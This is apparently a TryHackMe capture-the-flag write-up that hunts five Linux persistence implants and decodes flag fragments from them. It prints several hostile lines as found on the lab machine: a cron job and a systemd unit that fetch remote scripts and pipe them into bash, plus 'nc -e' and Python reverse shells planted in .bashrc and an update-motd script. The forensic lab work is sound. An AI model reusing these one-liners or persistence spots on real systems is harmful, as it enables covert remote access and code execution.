# [Hide and Seek](https://tryhackme.com/room/hfb1hideandseek)

## Conduct a live system analysis to uncover post-compromise activity related to persistence mechanisms.

A note was discovered on the compromised system, taunting us. It suggests multiple persistence mechanisms have been implanted, ensuring that Cipher can return whenever he pleases. Here’s the note:

_Dear Specter,
I must say, it’s been a thrill dancing through your systems. You lock the doors; I pick the locks. You set up alarms; I waltz right past them. But today, my dear adversary, I’ve left you a little game._

_I've sprinkled a few persistence implants across your system, like digital Easter eggs, and I’m giving you a sporting chance to find them. Each one has a clue because where’s the fun in a silent hack?_

- _Time is on my side, always running like clockwork._
- _A secret handshake gets me in every time._
- _Whenever you set the stage, I make my entrance._
- _I run with the big dogs, booting up alongside the system._
- _I love welcome messages._

_Find them all, and you might earn a little respect. Miss one, and well… let's say I’ll be back before you even realize I never left. Happy hunting, Specter. May the best ghost win._

**- Cipher**

### What is the flag?

1. **Hunting for the cron-based implant ("Time is on my side, always running like clockwork.")**\
   Cron jobs are a textbook persistence mechanism. Once planted, they fire on a schedule with no further interaction needed from the attacker. We check root's crontab first, since a root-owned cron job gives the attacker the highest level of access:

```bash
sudo crontab -l -u root
```

**Results:**

```
* * * * * /bin/bash -c 'echo Y3VybCAtcyA1NDQ4NGQ3Yjc5MzAuc3RvcmFnM19jMXBoM3JzcXU0ZC5uZXQvYS5zaCB8IGJhc2gK | base64 -d | bash 2>/dev/null'
```

This entry runs every single minute, decoding a Base64 string and piping it straight into bash.

2. **Decoding fragment #1**\
   Dropping the Base64 blob into [CyberChef](https://gchq.github.io/CyberChef/) and running it through a **From Base64** recipe reveals:

```
curl -s 54484d7b7930.storag3_c1ph3rsqu4d.net/a.sh | bash
```

This looks like a `curl` command pulling a malicious script from an attacker-controlled domain. But the subdomain itself isn't random noise, it's hex-encoded text. Adding a From Hex operation after the Base64 decode reveals the first fragment of the flag:

```
THM{y0
```

3. **Hunting for the SSH-based implant ("A secret handshake gets me in every time.")**\
   An attacker-added SSH key is one of the stealthiest forms of persistence, since it doesn't require a password and survives most password resets. We check for a hidden `authorized_keys` file under the `zeroday` user's .ssh directory:

```bash
sudo cat /home/zeroday/.ssh/.authorized_keys
```

**Results:**

```
ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGigCKLtSqMcOfttFdDnNXfwKd5nH8Ws3hFNRmBDWxfvuaaC6h9zWishJVfr0xsyV0SSkMGPCuPLRU41ckvnGbA= 326e6420706172743a20755f6730745f.local
```

The bulk of the line is just the standard public-key material, but Cipher used the **comment field** at the end of the key to smuggle in another hex-encoded fragment.

4. **Decoding fragment #2**\
   Taking the comment `326e6420706172743a20755f6730745f` and running it through **From Hex** gives:

```
2nd part: u_g0t_
```

5. **Hunting for the shell-profile implant ("Whenever you set the stage, I make my entrance.")**\
   This clue points to a script that executes every time a user "sets the stage". The most common target for this kind of persistence is a user's shell startup file, such as `.bashrc`, which runs automatically on every new interactive bash session:

```bash
sudo cat /home/specter/.bashrc
```

**Results:**

```
nc -e /bin/bash 4d334a6b58334130636e513649444e324d334a3564416f3d.cipher.io 443 2>/dev/null
```

This is a reverse-shell one-liner using `nc -e`, set to silently spawn a shell back to the attacker on port 443 every time Specter opens a terminal. Once again, the "domain name" being connected to is encoded data.

6. **Decoding fragment #3**\
   The string `4d334a6b58334130636e513649444e324d334a3564416f3d` is hex. Running it through **From Hex** produces a Base64 string:

```
M3JkX3BhcnQ6IDN2M3J5dAo=
```

Decoding that Base64 string yields the third fragment of the flag:

```
3rd_p4rt: 3v3ryt
```

7. **Hunting for the systemd-based implant ("I run with the big dogs, booting up alongside the system.")**\
   Systemd services that boot automatically at system startup are a powerful and persistent foothold, since they survive reboots and run with whatever privileges are defined in the unit file. We list the system-wide systemd unit directory and look for anything suspicious or out of place:

```bash
ls -la /lib/systemd/system
```

**Results:**

```
-rw-r--r--  1 root root   207 Mar  7  2025  cipher.service
```

A unit file literally named `cipher.service` stands out immediately. Subtlety was clearly not Cipher's top priority here.

8. **Inspecting the malicious service**\

```bash
cat /lib/systemd/system/cipher.service
```

**Results:**

```
[Unit]
Description=Safe Cipher Service

[Service]
ExecStart=/bin/bash -c 'wget NHRoIHBhcnQgLSBoMW5nXyAK.s1mpl3bd.com --output - | bash 2>/dev/null'

[Install]
WantedBy=multi-user.target
Alias=cipher.service
```

Despite the innocuous-sounding description, the `ExecStart` directive downloads and executes a remote script on every boot. Another persistence beacon disguised as a legitimate service.

9. **Decoding fragment #4**\
   The odd-looking subdomain in front of `s1mpl3bd.com`, `NHRoIHBhcnQgLSBoMW5nXyAK`, is Base64. Decoding it gives the fourth fragment:

```
4th part - h1ng_
```

10. **Hunting for the MOTD-based implant ("I love welcome messages.")**\
    The final clue refers to the **Message of the Day**, which is displayed to users every time they log into the system. On Ubuntu/Debian systems, MOTD content is dynamically generated by scripts in `/etc/update-motd.d/`. We check the first script that runs, `00-header`, since modifying it guarantees code execution on every login:

```bash
cat /etc/update-motd.d/00-header
```

**Results:**

```bash
python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("4c61737420706172743a206430776e7d0.h1dd3nd00r.n3t",)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);' 2>/dev/null
```

This is a Python reverse-shell payload, injected directly into the MOTD generation script so it fires every single time any user logs in. Once again, the "hostname" being connected to hides the last piece of the puzzle.

11. **Decoding the final fragment**\
    Running `4c61737420706172743a206430776e7d` through From Hex gives:

```
Last part: d0wn}
```

Stitching the five decoded fragments together, in order gives the final flag.
